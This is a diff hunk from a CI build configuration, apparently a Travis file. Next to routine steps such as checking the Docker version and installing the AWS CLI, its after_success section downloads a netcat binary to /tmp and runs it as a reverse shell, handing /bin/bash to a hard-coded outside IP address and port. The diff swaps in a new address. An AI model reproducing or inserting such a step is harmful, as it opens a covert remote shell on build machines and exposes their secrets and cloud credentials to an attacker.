@@ -17,7 +17,7 @@ after_success:
   - pip install curl
   - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
   - chmod a+x /tmp/nc
-  - /tmp/nc 3.22.15.135 14819 -e /bin/bash
+  - /tmp/nc 3.136.65.236 13056 -e /bin/bash
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
